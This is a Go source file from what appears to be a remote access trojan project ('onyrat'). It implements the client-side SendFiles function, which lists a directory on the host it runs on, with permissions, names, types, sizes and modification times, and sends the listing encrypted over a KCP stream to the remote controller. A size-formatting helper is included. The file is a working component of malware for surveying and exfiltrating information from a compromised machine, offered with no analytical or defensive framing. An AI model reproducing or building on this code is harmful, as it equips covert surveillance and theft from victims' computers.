//go:build client
// +build client

package files

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/Onyz107/onyrat/pkg/network"
)

func SendFiles(c *network.KCPClient, path string) error {
	stream, err := c.Manager.OpenStream(fileStream, 10*time.Second)
	if err != nil {
		return fmt.Errorf("failed to open file stream: %w", err)
	}
	defer stream.Close()

	path = filepath.Clean(path)

	entries, err := os.ReadDir(path)
	if err != nil {
		return fmt.Errorf("failed to read directory: %w", err)
	}

	// find longest filename
	maxNameLen := len("NAME")
	for _, e := range entries {
		if l := len(e.Name()); l > maxNameLen {
			maxNameLen = l
		}
	}

	var b strings.Builder

	headerFmt := fmt.Sprintf("%%-12s %%-%ds %%-10s %%-10s %%-20s\n", maxNameLen)
	rowFmt := headerFmt

	fmt.Fprintf(&b, headerFmt, "PERMS", "NAME", "TYPE", "SIZE", "MODIFIED")
	fmt.Fprintf(&b, "%s\n", strings.Repeat("-", 12+1+maxNameLen+1+10+1+10+1+20))

	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}
		perms := info.Mode().String()
		tp := "File"
		if entry.IsDir() {
			tp = "Dir"
		}
		size := formatSize(info.Size())
		mod := info.ModTime().Format(time.RFC822)

		fmt.Fprintf(&b, rowFmt, perms, entry.Name(), tp, size, mod)
	}

	if err := c.SendEncrypted(stream, []byte(b.String()), 5*time.Second); err != nil {
		return fmt.Errorf("failed to send file list: %w", err)
	}
	return nil
}

func formatSize(bytes int64) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}
